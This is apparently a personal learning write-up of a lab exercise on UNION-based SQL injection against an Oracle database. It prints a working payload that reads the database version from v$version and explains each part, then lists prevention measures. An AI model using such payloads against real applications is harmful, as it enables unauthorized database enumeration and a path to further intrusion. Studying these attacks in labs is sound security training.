# 💉 SQL Injection - Querying Database Version (Oracle)


Learned how to identify database type and version using SQL Injection on Oracle DB.

---

## 🔍 Step 1: Understanding the Scenario

The application uses a vulnerable parameter like:

```text
category=Gifts
```

Backend query:

```sql
SELECT * FROM products WHERE category='Gifts';
```

---

## ⚠️ Goal

Extract **database version information**.

---

## ⚔️ Step 2: Oracle-Specific Knowledge

Oracle requires selecting from:

```sql
dual
```

---

## ⚔️ Step 3: Exploit Payload

```sql
' UNION SELECT banner, NULL FROM v$version--
```

---

## 🧠 Explanation

* `v$version` → contains Oracle version info
* `banner` → readable version string
* `NULL` → matches column count

---

## 🚀 Result

Page displayed:

```text
Oracle Database 19c Enterprise Edition...
```

---

## 🏁 Final Result

Successfully extracted:

* Database type → Oracle
* Version → Oracle version info

---

## 🧠 Key Learnings

* Oracle requires `dual` / system tables
* `v$version` is critical for enumeration
* Column matching is essential

---

## 🔐 Prevention

* Parameterized queries
* No direct input in SQL
* Restrict DB metadata access

---

## 🔥 Insight

> First step in SQLi is knowing your database.
